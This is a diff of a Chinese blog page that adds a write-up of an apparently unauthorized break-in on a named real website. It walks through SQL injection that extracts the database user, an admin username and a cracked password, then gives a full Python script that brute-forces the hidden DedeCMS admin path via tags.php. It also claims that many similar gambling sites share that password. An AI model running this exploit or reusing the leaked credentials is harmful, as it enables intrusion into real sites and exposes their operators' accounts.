@@ -347,8 +347,7 @@
 
       
         
-          
-            <h2 id="最近搞到一个小站，拿出来分享一下。"><a href="#最近搞到一个小站，拿出来分享一下。" class="headerlink" title="最近搞到一个小站，拿出来分享一下。"></a>最近搞到一个小站，拿出来分享一下。</h2><p><strong>0x01</strong><br><br>说下思路，找到一个叫<a href="http://www.scps168.com的网站，通过一顿乱……发现注入点，那就进行sql之旅吧" target="_blank" rel="noopener">www.scps168.com的网站，通过一顿乱……发现注入点，那就进行sql之旅吧</a></p>
+          <h2 id="最近搞到一个小站，拿出来分享一下。"><a href="#最近搞到一个小站，拿出来分享一下。" class="headerlink" title="最近搞到一个小站，拿出来分享一下。"></a>最近搞到一个小站，拿出来分享一下。</h2><p><strong>0x01</strong><br><br>说下思路，找到一个叫<a href="http://www.scps168.com的网站，通过一顿乱……发现注入点，那就进行sql之旅吧" target="_blank" rel="noopener">www.scps168.com的网站，通过一顿乱……发现注入点，那就进行sql之旅吧</a></p>
 <p><img src="https://i.imgur.com/SkpOeqa.png" alt="注入点"></p>
 <p><strong>姿势一：报错注入获得数据库用户名</strong><br><img src="https://i.imgur.com/dIFNCzD.png" alt="报错注入"></p>
 <p>得到数据库用户名：root@localhost<br><br><strong>姿势二：爆破数据库</strong><br><img src="https://i.imgur.com/uMXj1LX.png" alt="爆破数据库"><br>得到：scps168<br><br><strong>姿势三:爆表</strong><br><br><strong>payload:</strong></p>
@@ -405,8 +404,25 @@
 </code></pre><p>用户名：yiding1666<br><img src="https://i.imgur.com/x1kjcKA.png" alt="获取内容"></p>
 <p>通过同样的方式构造payload,获取password,得到密码<br><img src="https://i.imgur.com/VQfTWxx.png" alt="密码"><br>1aaa2a1c894f404fbf20959ab227d43（再进行md5解密，你会发现少1位，后面补齐1位数字，都行）</p>
 <p>最后得到密码：qazwsx1234</p>
-
-          
+<p><strong>0x02</strong><br><br>刚开始测试就发现了后台路径:<br><img src="https://i.imgur.com/00RMdzm.png" alt=""><br>强行google,“D:/zzzjianzhan1”，发现一大批博彩网站，都是一键建站，管理员密码都一样。但是不知道管理员登录地址，随便点开一个发现是织梦的，于是乎想到前段时间有个织梦后台爆破脚本，在此附上代码：</p>
+<p><pre><code>#!/usr/bin/env python<br>‘’’/*</code></pre></p>
+<ul>
+<li>author = Mochazz</li>
+<li>team   = 红日安全团队</li>
+<li>env    = pyton3<br><em>
+</em>/<br>‘’’<br>import requests<br>import itertools<br>characters = “abcdefghijklmnopqrstuvwxyz0123456789_!#”<br>back_dir = “”<br>flag = 0<br>url = “<a href="http://192.168.1.9/tags.php&quot;" target="_blank" rel="noopener">http://192.168.1.9/tags.php&quot;</a><br>data = {<br>“_FILES[mochazz][tmp_name]” : “./{p}&lt;&lt;/images/adminico.gif”,<br>“_FILES[mochazz][name]” : 0,<br>“_FILES[mochazz][size]” : 0,<br>“_FILES[mochazz][type]” : “image/gif”<br>}</li>
+</ul>
+<p>for num in range(1,7):<br>if flag:<br>break<br>for pre in itertools.permutations(characters,num):<br>pre = ‘’.join(list(pre))<br>data[“_FILES[mochazz][tmp_name]”] = data[“_FILES[mochazz][tmp_name]”].format(p=pre)<br>print(“testing”,pre)<br>r = requests.post(url,data=data)<br>if “Upload filetype not allow !” not in r.text and r.status_code == 200:<br>flag = 1<br>back_dir = pre<br>data[“_FILES[mochazz][tmp_name]”] = “./{p}&lt;&lt;/images/adminico.gif”<br>break<br>else:<br>data[“_FILES[mochazz][tmp_name]”] = “./{p}&lt;&lt;/images/adminico.gif”<br>print(“[+] 前缀为：”,back_dir)<br>flag = 0<br>for i in range(30):<br>if flag:<br>break<br>for ch in characters:<br>if ch == characters[-1]:<br>flag = 1<br>break<br>data[“_FILES[mochazz][tmp_name]”] = data[“_FILES[mochazz][tmp_name]”].format(p=back_dir+ch)<br>r = requests.post(url, data=data)<br>if “Upload filetype not allow !” not in r.text and r.status_code == 200:<br>back_dir += ch<br>print(“[+] “,back_dir)<br>data[“_FILES[mochazz][tmp_name]”] = “./{p}&lt;&lt;/images/adminico.gif”<br>break<br>else:<br>data[“_FILES[mochazz][tmp_name]”] = “./{p}&lt;&lt;/images/adminico.gif”</p>
+<p>print(“后台地址为：”,back_dir)<br><br>Tips:换地址时保留tags.php<br><br><img src="https://i.imgur.com/bc3CPS7.png" alt=""></p>
+<p>跑出来之后得到：yiidng</p>
+<p>就说到这里了，还要继续的小朋友可以自己去玩玩，最后再说一句：大佬勿喷，谢谢！</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/15/拿站思路整理（仅供学习）/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
